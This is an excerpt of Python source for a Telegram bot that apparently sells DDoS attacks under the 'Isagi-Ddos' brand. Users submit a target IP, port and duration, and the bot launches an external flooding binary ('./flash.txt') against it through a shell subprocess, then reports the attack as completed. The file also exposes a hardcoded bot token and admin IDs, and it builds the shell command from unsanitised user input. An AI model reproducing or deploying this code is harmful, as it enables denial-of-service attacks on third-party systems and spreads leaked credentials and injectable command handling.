...
TOKEN = '7945844883:AAHYn31gPB2T6SJNWkPF5-9XJUWLacKCjuI'  # Replace with your actual bot token
ADMIN_IDS = [6353114118]  # Added new admin ID
CHANNEL_ID = '-1002343928227'  # Replace with your specific channel or group ID
...
def show_help(message):
    response = (
        ...
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "💠 *『 𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 』* 💠\n"
        "🔄 `/reset` - ⚙️ *Reset attack limits!*\n\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "🔗 *𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬:* [⚡ ISAGI](https://t.me/+pqLGPfij-_8wNzI9) 💀\n"
    )
...
def TF_command(message):
    ...
    try:
        ...
        logging.info(f"Attack started by @{username}: ./flash.txt {target_ip} {target_port} {default_duration} 1200")
...
async def run_attack_command_async(chat_id, target_ip, target_port, duration, user_duration, username):
    global active_attacks
    try:
        command = f"./flash.txt {target_ip} {target_port} {duration} 1200"
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()
        bot.send_message(
            chat_id,
            f"🌊ѦƮṪ𝘼₡𝘒 ₡𝓞𝑀ℙLỄṪỄĎ🌊\n\n𝐓𝐀𝐑𝐆𝐄𝐓 -> {target_ip}\n𝐏𝐎𝐑𝐓 -> {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ \n[ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺 Isagi-Ddos™"
        )
    except Exception as e:
